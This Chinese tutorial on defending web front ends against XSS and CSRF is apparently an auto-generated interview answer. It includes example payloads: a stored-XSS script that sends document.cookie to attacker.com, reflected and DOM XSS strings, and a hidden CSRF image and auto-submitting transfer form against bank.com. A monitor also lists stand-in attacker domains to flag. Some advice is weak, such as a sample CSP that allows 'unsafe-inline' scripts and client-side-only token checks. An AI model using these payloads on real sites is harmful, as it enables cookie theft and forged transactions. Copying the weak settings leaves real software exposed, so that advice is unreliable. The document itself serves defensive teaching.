---
title: 前端的安全防护（XSS、CSRF）
tags:
  - 前端工程化
status: robot
class: 前端工程化
slug: frontend-security-xss-csrf
ref:
---

## 核心要点

**XSS防护**:输入验证+输出编码+CSP策略+HttpOnly Cookie,针对存储型/反射型/DOM型XSS采用不同防护手段
**CSRF防护**:Token验证+双重提交Cookie+SameSite属性+Referer检查,确保请求来源合法性
**纵深防御**:客户端防护+服务端验证+网络层安全+安全监控,构建多层安全防护体系

---

## 详细回答

前端安全防护是Web应用安全的第一道防线,我将从XSS、CSRF攻击原理和防护策略,以及安全开发最佳实践三个维度详细阐述。

### 一、XSS（跨站脚本攻击）防护

#### 1. XSS攻击类型与原理

**存储型XSS（Persistent XSS）**
恶意脚本被存储在服务器数据库中,当其他用户访问时被执行。

```javascript
// 危险示例 - 未经处理的用户输入直接渲染
function renderComment(comment) {
  document.getElementById('comments').innerHTML += `
    <div class="comment">
      <h4>${comment.username}</h4>
      <p>${comment.content}</p> <!-- 如果content包含<script>标签就会执行 -->
    </div>
  `;
}

// 攻击者可能提交这样的评论内容:
// <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**反射型XSS（Reflected XSS）**
恶意脚本通过URL参数传递,在响应中反射给用户。

```javascript
// 危险示例 - 直接使用URL参数
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('q');
document.getElementById('result').innerHTML = `搜索结果: ${searchTerm}`;

// 攻击URL: https://example.com/search?q=<script>alert('XSS')</script>
```

**DOM型XSS（DOM-based XSS）**
完全在客户端发生,通过修改DOM环境执行恶意脚本。

```javascript
// 危险示例 - 动态修改DOM
function updatePage() {
  const hash = window.location.hash.substring(1);
  document.getElementById('content').innerHTML = decodeURIComponent(hash);
}

// 攻击URL: https://example.com/#<img src=x onerror=alert('XSS')>
```

#### 2. XSS防护策略实现

**A. 输入验证与过滤**

```javascript
// 严格的输入验证类
class InputValidator {
  // 邮箱验证
  static validateEmail(email) {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email) && email.length <= 254;
  }

  // 用户名验证（只允许字母数字下划线）
  static validateUsername(username) {
    const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
    return usernameRegex.test(username);
  }

  // HTML内容验证（移除潜在危险标签）
  static sanitizeHTML(input) {
    const allowedTags = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li'];
    const allowedAttributes = ['class', 'id'];

    // 使用DOMPurify库进行安全清理
    return DOMPurify.sanitize(input, {
      ALLOWED_TAGS: allowedTags,
      ALLOWED_ATTR: allowedAttributes,
      FORBID_SCRIPT: true,
      FORBID_TAGS: ['script', 'object', 'embed', 'link', 'style'],
      FORBID_ATTR: ['onclick', 'onload', 'onmouseover', 'onfocus', 'onblur']
    });
  }

  // URL验证（防止javascript:协议等）
  static validateURL(url) {
    try {
      const urlObj = new URL(url);
      const allowedProtocols = ['http:', 'https:', 'mailto:'];
      return allowedProtocols.includes(urlObj.protocol);
    } catch {
      return false;
    }
  }
}
```

**B. 输出编码（Output Encoding）**

```javascript
// HTML编码工具类
class HTMLEncoder {
  // HTML实体编码
  static encode(input) {
    if (typeof input !== 'string') return input;

    const entityMap = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;',
      '`': '&#x60;',
      '=': '&#x3D;'
    };

    return input.replace(/[&<>"'`=\/]/g, char => entityMap[char]);
  }

  // JavaScript字符串编码
  static encodeForJS(input) {
    if (typeof input !== 'string') return input;

    return input
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t')
      .replace(/\f/g, '\\f')
      .replace(/\v/g, '\\v')
      .replace(/\0/g, '\\0');
  }

  // URL编码
  static encodeForURL(input) {
    return encodeURIComponent(input);
  }

  // CSS编码
  static encodeForCSS(input) {
    return input.replace(/[^a-zA-Z0-9\-_]/g, char =>
      '\\' + char.charCodeAt(0).toString(16).padStart(2, '0')
    );
  }
}

// 安全的DOM操作封装
class SafeDOM {
  // 安全设置文本内容
  static setText(element, text) {
    element.textContent = text; // 使用textContent而不是innerHTML
  }

  // 安全设置HTML内容
  static setHTML(element, html) {
    element.innerHTML = HTMLEncoder.encode(html);
  }

  // 安全创建元素
  static createElement(tag, attributes = {}, textContent = '') {
    const element = document.createElement(tag);

    // 安全设置属性
    for (const [key, value] of Object.entries(attributes)) {
      if (this.isValidAttribute(key, value)) {
        element.setAttribute(key, HTMLEncoder.encode(value));
      }
    }

    if (textContent) {
      element.textContent = textContent;
    }

    return element;
  }

  // 验证属性是否安全
  static isValidAttribute(name, value) {
    // 禁止事件处理器属性
    if (name.toLowerCase().startsWith('on')) {
      return false;
    }

    // 禁止javascript:协议
    if (typeof value === 'string' && value.toLowerCase().includes('javascript:')) {
      return false;
    }

    return true;
  }
}
```

**C. 内容安全策略（CSP）**

```javascript
// CSP策略配置
class CSPManager {
  // 生成CSP头部
  static generateCSPHeader() {
    const policies = [
      "default-src 'self'", // 默认只允许同源资源
      "script-src 'self' 'unsafe-inline' https://trusted-cdn.com", // 脚本来源
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com", // 样式来源
      "img-src 'self' data: https:", // 图片来源
      "font-src 'self' https://fonts.gstatic.com", // 字体来源
      "connect-src 'self' https://api.example.com", // AJAX/WebSocket连接
      "frame-src 'none'", // 禁用iframe
      "object-src 'none'", // 禁用插件
      "base-uri 'self'", // 限制base标签
      "form-action 'self'", // 限制表单提交目标
      "upgrade-insecure-requests", // 升级HTTP到HTTPS
      "block-all-mixed-content" // 阻止混合内容
    ];

    return policies.join('; ');
  }

  // 动态设置CSP（用于单页应用）
  static setCSP() {
    const meta = document.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = this.generateCSPHeader();
    document.head.appendChild(meta);
  }

  // 处理CSP违规报告
  static handleCSPViolation(violationReport) {
    console.warn('CSP Violation:', violationReport);

    // 上报违规信息到安全监控系统
    this.reportSecurityViolation({
      type: 'csp_violation',
      blocked_uri: violationReport.blockedURI,
      document_uri: violationReport.documentURI,
      violated_directive: violationReport.violatedDirective,
      original_policy: violationReport.originalPolicy,
      timestamp: Date.now()
    });
  }
}

// 监听CSP违规事件
document.addEventListener('securitypolicyviolation', (e) => {
  CSPManager.handleCSPViolation(e);
});
```

**D. 模板引擎安全配置**

```javascript
// 安全的模板渲染（以类似Vue的方式）
class SecureTemplate {
  constructor() {
    this.escapeHTML = true;
    this.allowedDirectives = ['v-text', 'v-show', 'v-if'];
  }

  // 安全渲染模板
  render(template, data) {
    // 移除危险指令
    template = this.sanitizeTemplate(template);

    // 对数据进行HTML编码
    const safeData = this.escapeData(data);

    return this.processTemplate(template, safeData);
  }

  sanitizeTemplate(template) {
    // 移除v-html等危险指令
    const dangerousDirectives = ['v-html', 'v-raw'];
    dangerousDirectives.forEach(directive => {
      const regex = new RegExp(`${directive}="[^"]*"`, 'gi');
      template = template.replace(regex, '');
    });

    return template;
  }

  escapeData(data) {
    if (typeof data === 'string') {
      return HTMLEncoder.encode(data);
    }

    if (Array.isArray(data)) {
      return data.map(item => this.escapeData(item));
    }

    if (typeof data === 'object' && data !== null) {
      const escaped = {};
      for (const [key, value] of Object.entries(data)) {
        escaped[key] = this.escapeData(value);
      }
      return escaped;
    }

    return data;
  }
}
```

### 二、CSRF（跨站请求伪造）防护

#### 1. CSRF攻击原理

CSRF攻击利用用户已登录的身份,在用户不知情的情况下发送恶意请求。

```html
<!-- 攻击者网站上的恶意代码 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- 或使用JavaScript自动提交表单 -->
<script>
document.body.innerHTML += `
  <form id="maliciousForm" action="https://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
  </form>
`;
document.getElementById('maliciousForm').submit();
</script>
```

#### 2. CSRF防护策略实现

**A. CSRF Token验证**

```javascript
// CSRF Token管理器
class CSRFTokenManager {
  constructor() {
    this.tokenName = '_csrf_token';
    this.headerName = 'X-CSRF-Token';
    this.token = this.generateToken();
  }

  // 生成随机Token
  generateToken() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }

  // 获取当前Token
  getToken() {
    return this.token;
  }

  // 刷新Token
  refreshToken() {
    this.token = this.generateToken();
    this.updateTokenInForms();
    this.updateTokenInMetaTag();
    return this.token;
  }

  // 在所有表单中添加CSRF Token
  updateTokenInForms() {
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      let tokenInput = form.querySelector(`input[name="${this.tokenName}"]`);

      if (!tokenInput) {
        tokenInput = document.createElement('input');
        tokenInput.type = 'hidden';
        tokenInput.name = this.tokenName;
        form.appendChild(tokenInput);
      }

      tokenInput.value = this.token;
    });
  }

  // 在meta标签中更新Token（供AJAX使用）
  updateTokenInMetaTag() {
    let metaTag = document.querySelector(`meta[name="${this.tokenName}"]`);

    if (!metaTag) {
      metaTag = document.createElement('meta');
      metaTag.name = this.tokenName;
      document.head.appendChild(metaTag);
    }

    metaTag.content = this.token;
  }

  // 验证Token
  validateToken(receivedToken) {
    return this.token === receivedToken && receivedToken.length === 64;
  }
}

// 全局CSRF管理实例
const csrfManager = new CSRFTokenManager();
```

**B. 请求拦截器（自动添加Token）**

```javascript
// HTTP客户端CSRF防护
class SecureHTTPClient {
  constructor() {
    this.csrfManager = csrfManager;
    this.setupInterceptors();
  }

  setupInterceptors() {
    // 拦截fetch请求
    const originalFetch = window.fetch;
    window.fetch = (url, options = {}) => {
      // 只对POST、PUT、DELETE、PATCH请求添加CSRF Token
      const method = options.method?.toUpperCase() || 'GET';
      if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method)) {
        options.headers = {
          ...options.headers,
          [this.csrfManager.headerName]: this.csrfManager.getToken()
        };
      }

      return originalFetch(url, options);
    };

    // 拦截XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      this._method = method.toUpperCase();
      return originalXHROpen.call(this, method, url, async, user, password);
    };

    const originalXHRSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(data) {
      if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(this._method)) {
        this.setRequestHeader(
          csrfManager.headerName,
          csrfManager.getToken()
        );
      }
      return originalXHRSend.call(this, data);
    };
  }

  // 安全的GET请求
  async get(url, options = {}) {
    return fetch(url, {
      method: 'GET',
      credentials: 'same-origin', // 发送同源Cookie
      ...options
    });
  }

  // 安全的POST请求
  async post(url, data, options = {}) {
    return fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      },
      credentials: 'same-origin',
      body: JSON.stringify(data),
      ...options
    });
  }

  // 安全的表单提交
  async submitForm(formData, url, options = {}) {
    // 添加CSRF Token到FormData
    formData.append(csrfManager.tokenName, csrfManager.getToken());

    return fetch(url, {
      method: 'POST',
      credentials: 'same-origin',
      body: formData,
      ...options
    });
  }
}
```

**C. 双重提交Cookie**

```javascript
// 双重提交Cookie实现
class DoubleSubmitCookie {
  constructor() {
    this.cookieName = '_csrf';
    this.headerName = 'X-CSRF-Token';
  }

  // 设置CSRF Cookie
  setCSRFCookie() {
    const token = this.generateSecureToken();

    // 设置HttpOnly=false的Cookie（前端可读取）
    document.cookie = `${this.cookieName}=${token}; Path=/; Secure; SameSite=Strict`;

    return token;
  }

  // 获取CSRF Cookie值
  getCSRFCookie() {
    const cookies = document.cookie.split(';');
    const csrfCookie = cookies.find(cookie =>
      cookie.trim().startsWith(`${this.cookieName}=`)
    );

    return csrfCookie ? csrfCookie.split('=')[1] : null;
  }

  // 验证双重提交
  validateDoubleSubmit(headerToken) {
    const cookieToken = this.getCSRFCookie();
    return cookieToken && headerToken && cookieToken === headerToken;
  }

  generateSecureToken() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return btoa(String.fromCharCode(...array))
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }
}
```

**D. SameSite Cookie配置**

```javascript
// Cookie安全设置管理
class SecureCookieManager {
  // 设置安全Cookie
  static setSecureCookie(name, value, options = {}) {
    const defaultOptions = {
      path: '/',
      secure: true, // 仅HTTPS传输
      sameSite: 'Strict', // 严格同站策略
      httpOnly: false, // 前端需要读取时设为false
      maxAge: 3600 // 1小时过期
    };

    const finalOptions = { ...defaultOptions, ...options };

    let cookieString = `${name}=${encodeURIComponent(value)}`;

    // 添加安全属性
    if (finalOptions.path) cookieString += `; Path=${finalOptions.path}`;
    if (finalOptions.domain) cookieString += `; Domain=${finalOptions.domain}`;
    if (finalOptions.maxAge) cookieString += `; Max-Age=${finalOptions.maxAge}`;
    if (finalOptions.expires) cookieString += `; Expires=${finalOptions.expires}`;
    if (finalOptions.secure) cookieString += '; Secure';
    if (finalOptions.httpOnly) cookieString += '; HttpOnly';
    if (finalOptions.sameSite) cookieString += `; SameSite=${finalOptions.sameSite}`;

    document.cookie = cookieString;
  }

  // 删除Cookie
  static deleteCookie(name, path = '/') {
    document.cookie = `${name}=; Path=${path}; Max-Age=0`;
  }

  // 获取Cookie值
  static getCookie(name) {
    const cookies = document.cookie.split(';');
    const targetCookie = cookies.find(cookie =>
      cookie.trim().startsWith(`${name}=`)
    );

    return targetCookie ?
      decodeURIComponent(targetCookie.split('=')[1]) : null;
  }
}
```

### 三、其他安全防护措施

#### 1. 点击劫持（Clickjacking）防护

```javascript
// 点击劫持防护
class ClickjackingProtection {
  // X-Frame-Options防护
  static preventFraming() {
    // 检查是否在iframe中
    if (window.top !== window.self) {
      // 可能是点击劫持攻击
      this.handlePotentialClickjacking();
    }
  }

  // 处理潜在的点击劫持
  static handlePotentialClickjacking() {
    // 方案1: 跳转到顶层窗口
    try {
      window.top.location = window.location;
    } catch (e) {
      // 方案2: 隐藏页面内容
      document.body.style.display = 'none';
      alert('检测到安全风险，页面已被阻止显示');
    }
  }

  // Frame-busting代码
  static framebusting() {
    if (window !== window.top) {
      window.top.location = window.location;
    }
  }
}

// 页面加载时检查
document.addEventListener('DOMContentLoaded', () => {
  ClickjackingProtection.preventFraming();
});
```

#### 2. 安全的第三方集成

```javascript
// 安全的第三方脚本加载
class SecureScriptLoader {
  static loadScript(src, options = {}) {
    return new Promise((resolve, reject) => {
      const script = document.createElement('script');

      // 安全属性设置
      script.src = src;
      script.async = options.async !== false;
      script.crossOrigin = 'anonymous'; // CORS安全
      script.referrerPolicy = 'no-referrer'; // 不发送Referer

      // 子资源完整性(SRI)验证
      if (options.integrity) {
        script.integrity = options.integrity;
      }

      // 内容安全策略
      if (options.nonce) {
        script.nonce = options.nonce;
      }

      script.onload = () => resolve(script);
      script.onerror = () => reject(new Error(`Failed to load script: ${src}`));

      document.head.appendChild(script);
    });
  }

  // 安全加载第三方SDK
  static async loadThirdPartySDK(config) {
    const { src, integrity, version, timeout = 10000 } = config;

    // 验证来源是否在白名单中
    if (!this.isAllowedOrigin(src)) {
      throw new Error('Third-party origin not allowed');
    }

    // 设置超时
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Script load timeout')), timeout)
    );

    // 加载脚本
    const loadPromise = this.loadScript(src, { integrity });

    return Promise.race([loadPromise, timeoutPromise]);
  }

  static isAllowedOrigin(url) {
    const allowedOrigins = [
      'https://cdn.jsdelivr.net',
      'https://unpkg.com',
      'https://cdnjs.cloudflare.com'
    ];

    try {
      const origin = new URL(url).origin;
      return allowedOrigins.includes(origin);
    } catch {
      return false;
    }
  }
}
```

#### 3. 安全监控与告警

```javascript
// 安全事件监控
class SecurityMonitor {
  constructor() {
    this.events = [];
    this.maxEvents = 1000;
    this.setupEventListeners();
  }

  setupEventListeners() {
    // 监控XSS尝试
    this.monitorDOMChanges();

    // 监控异常网络请求
    this.monitorNetworkRequests();

    // 监控控制台访问
    this.monitorConsoleAccess();

    // 监控页面篡改
    this.monitorPageIntegrity();
  }

  // 监控DOM变化（可能的XSS）
  monitorDOMChanges() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.type === 'childList') {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === Node.ELEMENT_NODE) {
              this.checkForMaliciousContent(node);
            }
          });
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }

  // 检查恶意内容
  checkForMaliciousContent(element) {
    // 检查脚本标签
    if (element.tagName === 'SCRIPT') {
      this.reportSecurityEvent('suspicious_script_injection', {
        src: element.src,
        innerHTML: element.innerHTML.substring(0, 100)
      });
    }

    // 检查事件处理器
    const eventAttributes = ['onclick', 'onload', 'onmouseover'];
    eventAttributes.forEach(attr => {
      if (element.hasAttribute(attr)) {
        this.reportSecurityEvent('suspicious_event_handler', {
          attribute: attr,
          value: element.getAttribute(attr)
        });
      }
    });

    // 检查javascript:协议
    const links = element.querySelectorAll('a[href^="javascript:"]');
    if (links.length > 0) {
      this.reportSecurityEvent('javascript_protocol_detected', {
        count: links.length
      });
    }
  }

  // 监控网络请求
  monitorNetworkRequests() {
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
      const [url, options] = args;

      // 检查是否为可疑请求
      if (this.isSuspiciousRequest(url, options)) {
        this.reportSecurityEvent('suspicious_network_request', {
          url: url.toString(),
          method: options?.method || 'GET'
        });
      }

      return originalFetch.apply(this, args);
    };
  }

  isSuspiciousRequest(url, options) {
    const urlStr = url.toString();

    // 检查外部域名请求
    if (!urlStr.startsWith(window.location.origin)) {
      const suspiciousDomains = [
        'attacker.com',
        'malicious.net',
        'data-theft.org'
      ];

      return suspiciousDomains.some(domain => urlStr.includes(domain));
    }

    return false;
  }

  // 上报安全事件
  reportSecurityEvent(eventType, details) {
    const event = {
      type: eventType,
      details,
      timestamp: Date.now(),
      url: window.location.href,
      userAgent: navigator.userAgent
    };

    this.events.push(event);

    // 保持事件数量在限制内
    if (this.events.length > this.maxEvents) {
      this.events.shift();
    }

    // 实时上报严重事件
    if (this.isCriticalEvent(eventType)) {
      this.sendImmediateAlert(event);
    }

    console.warn('Security Event Detected:', event);
  }

  isCriticalEvent(eventType) {
    const criticalEvents = [
      'suspicious_script_injection',
      'csrf_attack_detected',
      'xss_payload_detected'
    ];

    return criticalEvents.includes(eventType);
  }

  async sendImmediateAlert(event) {
    try {
      await fetch('/api/security/alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(event),
        credentials: 'same-origin'
      });
    } catch (error) {
      console.error('Failed to send security alert:', error);
    }
  }
}

// 初始化安全监控
const securityMonitor = new SecurityMonitor();
```

### 四、实践经验与最佳实践

#### 1. 安全开发流程

在之前负责的金融项目中,我们建立了完整的安全开发生命周期:

**设计阶段安全考虑:**
- 威胁建模分析,识别潜在攻击面
- 安全架构设计,实施纵深防御
- 数据流分析,确保敏感数据保护

**开发阶段安全实践:**
- 安全编码规范,禁止使用危险函数
- 代码静态分析,自动检测安全漏洞
- 依赖安全扫描,及时更新有漏洞的库

**测试阶段安全验证:**
- 渗透测试验证防护有效性
- 安全回归测试确保修复质量
- 模糊测试发现边界条件漏洞

#### 2. 常见安全误区

**误区1: 仅依赖前端验证**
- 问题: 前端验证可以被绕过
- 解决: 前后端双重验证,前端负责用户体验,后端负责安全

**误区2: 忽视第三方库安全**
- 问题: 使用有漏洞的第三方库
- 解决: 定期安全扫描,及时更新依赖

**误区3: 过度信任用户输入**
- 问题: 未对用户输入进行充分验证
- 解决: 始终假设用户输入是恶意的

#### 3. 安全工具链推荐

**静态代码分析:**
- ESLint Security插件: 检测JavaScript安全问题
- SonarQube: 全面的代码质量和安全分析
- Semgrep: 快速的安全模式匹配

**依赖安全扫描:**
- npm audit: Node.js依赖漏洞扫描
- Snyk: 商业级依赖安全监控
- OWASP Dependency Check: 开源依赖检查

**运行时防护:**
- WAF(Web应用防火墙): 阻止恶意请求
- RASP(运行时应用自我保护): 应用内部防护
- CSP监控: 内容安全策略违规检测

通过系统性的安全防护措施,我们可以有效防御XSS、CSRF等常见Web攻击,保障用户数据安全和系统稳定性。安全是一个持续的过程,需要在整个开发生命周期中持续关注和改进。
